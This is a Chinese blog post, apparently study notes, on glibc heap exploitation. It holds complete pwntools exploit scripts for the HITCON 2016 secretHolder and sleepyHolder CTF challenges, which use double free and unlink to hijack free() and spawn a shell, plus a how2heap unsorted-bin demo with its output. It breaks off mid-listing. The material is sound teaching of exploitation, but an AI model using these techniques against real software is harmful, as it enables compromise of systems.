<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><h4 id="hitcon-2016-secretHolder"><a href="#hitcon-2016-secretHolder" class="headerlink" title="hitcon_2016_secretHolder"></a>hitcon_2016_secretHolder</h4><p>题目流程比较简单，没有开启<code>PIE</code>并且有全局变量，在消除堆块的代码块里没有对堆块的使用情况做判断，导致<code>double free</code>。在开始利用到了<code>fastbin_dup_consolidate</code>的技巧制造堆块重叠使得我们能够修改堆块头，之后就是unlink的操作实现任意地址写。</p>
<p><strong>需要注意的是，我们在分配<code>huge</code>这个超大堆块（0x61A80）的时候，<code>sysmalloc()</code>函数是调用了<code>mmap()</code>来进行扩展堆块的，因为0x61A80已经超过了阈值<code>mp_.mmap_threshold</code>（一般为128KB），导致我们的堆块与现存的堆块有一段偏移，难以利用，那如何解决？我们发现在libc释放由<code>mmap()</code>分配的堆块时，会动态调整阈值，这里很明显是调大了阈值，使得下一次我们再次请求<code>huge</code>这个堆块的时候，就会获得与当前堆块紧邻的堆块，达到我们unlink的条件。</strong>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);	<span class="hljs-comment">// 调整阈值</span><br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./secretHolder_hitcon_2016&quot;</span>)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br>sda = <span class="hljs-keyword">lambda</span> information, data : sh.sendafter(information, data)<br>sdla = <span class="hljs-keyword">lambda</span> information, data : sh.sendlineafter(information, data)<br><br>small_ptr_addr = <span class="hljs-number">0x6020B0</span><br>big_ptr_addr = <span class="hljs-number">0x6020A0</span><br>elf = ELF(<span class="hljs-string">&#x27;./secretHolder_hitcon_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keep</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renew</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;3. Huge secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))    <br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)     <span class="hljs-comment"># double free:free chunk_2</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)     <span class="hljs-comment"># chunk_1,chunk_2 overlapping</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">3</span>)		<span class="hljs-comment"># change mp_.mmap_threshold</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-comment"># unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x20</span>)<br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">3</span>*<span class="hljs-number">8</span>) + p64(small_ptr_addr - <span class="hljs-number">2</span>*<span class="hljs-number">8</span>)<br>fake_chunk += p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x61A90</span>)<br>renew(<span class="hljs-number">2</span>, fake_chunk)<br>wipe(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># free(big_ptr)-&gt;puts(puts_got)</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(free_got)    <span class="hljs-comment"># big_ptr-&gt;free_got</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(big_ptr_addr)   <span class="hljs-comment"># small_ptr-&gt;big_ptr_addr</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(puts_plt))     <span class="hljs-comment"># free_got-&gt;puts_plt</span><br>renew(<span class="hljs-number">1</span>, p64(puts_got))<br><br><span class="hljs-comment"># leak libc_addr</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(sh.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>info(<span class="hljs-string">&#x27;puts_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh = libc_base + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br><span class="hljs-comment"># free(small_ptr)-&gt;system(&#x27;/bin/sh&#x27;)</span><br>payload = p64(str_bin_sh) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># big_ptr-&gt;str_bin_sh</span><br>payload += p64(free_got)    <span class="hljs-comment"># small_ptr-&gt;free_got</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">1</span>, p64(sys_addr))<br><br><span class="hljs-comment"># pwn</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>



<h4 id="hitcon-2016-sleepyHolder"><a href="#hitcon-2016-sleepyHolder" class="headerlink" title="hitcon_2016_sleepyHolder"></a>hitcon_2016_sleepyHolder</h4><p>与上一道题目非常相似，但是<code>huge</code>堆块一旦分配了就无法再释放，利用难度陡增。这里同样是利用了<code>fastbin_dump_consolidate</code>方法来制造堆块重叠，与此同时，这里也存在<code>double free</code>。</p>
<p><strong>这里我们分配的<code>small</code>堆块为0x28，实际上是存在<code>presize</code>的复用，利用这点我们可以修改堆块头，但是如何修改下一个堆块的<code>size</code>标记位？需要注意的是，不管是在malloc还是free操作的时候，对于fastbin，是不会修改其下一个堆块的标志位的，我们可以利用<code>consolidate</code>将<code>samll</code>堆块放入unsortedbin中，并且利用<code>double free</code>再次将<code>small</code>链入fastbin中，这样我们再次申请<code>small</code>堆块的时候就成功修改其下一个堆块的标志位。</strong></p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># from LibcSearcher import *</span><br><br>sh = process(<span class="hljs-string">&quot;./sleepyHolder_hitcon_2016&quot;</span>)<br><span class="hljs-comment"># sh = remote(&quot;node4.buuoj.cn&quot;, 28881)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br>sda = <span class="hljs-keyword">lambda</span> information, data : sh.sendafter(information, data)<br>sdla = <span class="hljs-keyword">lambda</span> information, data : sh.sendlineafter(information, data)<br><br>elf = ELF(<span class="hljs-string">&quot;./sleepyHolder_hitcon_2016&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>small_ptr_addr = <span class="hljs-number">0x6020D0</span><br>big_ptr_addr = <span class="hljs-number">0x6020C0</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keep</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> == <span class="hljs-number">3</span> :<br>        sdla(<span class="hljs-string">&#x27;3. Keep a huge secret and lock it forever&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    <br>    <span class="hljs-keyword">else</span> :<br>        sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">renew</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data</span>):<br>    sdla(<span class="hljs-string">&#x27;3. Renew secret&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&#x27;2. Big secret&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))    <br>    sda(<span class="hljs-string">&#x27;Tell me your secret: &#x27;</span>, data)<br><br>sdla(<span class="hljs-string">&quot;Waking Sleepy Holder up ...&quot;</span>, <span class="hljs-string">b&#x27;zyy&#x27;</span>)<br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)    <span class="hljs-comment"># consolidate</span><br>wipe(<span class="hljs-number">1</span>)     <span class="hljs-comment"># link to fastbin</span><br><br><span class="hljs-comment"># unlink</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x20</span>)     <span class="hljs-comment"># fake_size</span><br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">3</span>*<span class="hljs-number">8</span>)     <span class="hljs-comment"># fake_fd</span><br>fake_chunk += p64(small_ptr_addr - <span class="hljs-number">2</span>*<span class="hljs-number">8</span>)     <span class="hljs-comment"># fake_bk</span><br>fake_chunk += p64(<span class="hljs-number">0x20</span>)     <span class="hljs-comment"># fake_presize</span><br>keep(<span class="hljs-number">1</span>, fake_chunk)<br>wipe(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># free(big_ptr)-&gt;puts(puts_got)</span><br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>) + p64(free_got)    <span class="hljs-comment"># big_ptr-&gt;free_got</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(big_ptr_addr)   <span class="hljs-comment"># small_ptr-&gt;big_ptr_addr</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(puts_plt))     <span class="hljs-comment"># free_got-&gt;puts_plt</span><br>renew(<span class="hljs-number">1</span>, p64(puts_got))<br><br><span class="hljs-comment"># leak libc_addr</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>info(<span class="hljs-string">&#x27;puts_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment"># libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="hljs-comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br>info(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment"># sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br>str_bin_sh = libc_base + libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><span class="hljs-comment"># str_bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><br><span class="hljs-comment"># free(small_ptr)-&gt;system(&#x27;/bin/sh&#x27;)</span><br>payload = p64(str_bin_sh) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># big_ptr-&gt;str_bin_sh</span><br>payload += p64(free_got)    <span class="hljs-comment"># small_ptr-&gt;free_got</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">1</span>, p64(sys_addr))<br><br><span class="hljs-comment"># pwn</span><br>wipe(<span class="hljs-number">2</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h3><p>在libc的源码里面我们看到malloc函数在寻找unsortedbin中的chunk的时候，由于unsortedbin的规则是<code>FIFO</code>，即先进先出，malloc首先会找到unsortedbin里存放的bk指针，找到最开始链入的chunk，也就是链里最后的chunk，如果我们能够修改该堆块的头和内容，那么其bk所指向的就有可能是我们伪造的fake_chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>	<span class="hljs-type">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br><br>	<span class="hljs-type">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><span class="hljs-comment">// 再次请求防止victim与top chunk合并</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br><br>	<span class="hljs-type">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br><br>	<span class="hljs-built_in">free</span>(victim);<br><br><br><span class="hljs-comment">// 在栈上伪造一个chunk</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br><span class="hljs-comment">// size设置成下一个请求的大小，bk指针指向任何一个可写的地址</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br><br>	stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;		<span class="hljs-comment">// 包含chunk的头部</span><br><br>	stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer;	<span class="hljs-comment">// bk指针指向自己</span><br><br><br><br>	<span class="hljs-comment">//------------VULNERABILITY-----------</span><br><span class="hljs-comment">// 存在一个漏洞修改victim的size和bk指针</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br><span class="hljs-comment">// size必须和请求的size不同，使得我们能够返回fake_chunk</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br><br>	victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;	<span class="hljs-comment">// 修改size</span><br><br>	victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>	<span class="hljs-comment">//------------------------------------</span><br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br><br>	<span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><span class="hljs-comment">// 这时候返回的就是我们所需要的chunk</span><br><br><br>	<span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br>	<span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br><br><br>	assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsorted_bin_into_stack<br>Allocating the victim chunk<br>Allocating another chunk to avoid consolidating the top chunk with the small one during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br>Freeing the chunk 0x1227420, it will be inserted in the unsorted bin<br>Create a fake chunk on the stackSet size <span class="hljs-keyword">for</span> next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer<br>Size should be different from the next request size to <span class="hljs-keyword">return</span> fake_chunk and need to pass the check 2*<span class="hljs-title function_">SIZE_SZ</span> <span class="hljs-params">(&gt; <span class="hljs-number">16</span> on x64)</span> &amp;&amp; &lt; av-&gt;system_mem<br>Now next <span class="hljs-built_in">malloc</span> will <span class="hljs-keyword">return</span> the region of our fake chunk: 0x7ffd067c2390<br><span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">0x100</span>)</span>: 0x7ffd067c2390<br>Nice jump d00d<br></code></pre></td></tr></table></figure>



<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><p>由于unsortedbin取出堆块的时候，会将其bk所指向的堆块写入当前unsorted的bk指针，同时会将该unsortedbin中的fd指针写入下一个堆块的fd指针区域，使得目标地址里写入了超大的值（unsortedbin的fd的值），如下：</p>
<ul>
<li><code>victim = unsorted_chunks(av)-&gt;bk</code></li>
<li><code>bck = victim-&gt;bk = p-&gt;bk = target_addr-16</code></li>
<li><code>unsorted_chunks(av)-&gt;bk = bck = target_addr-16</code></li>
<li><code>bck-&gt;fd = *(target_addr -16+16) = unsorted_chunks(av);</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 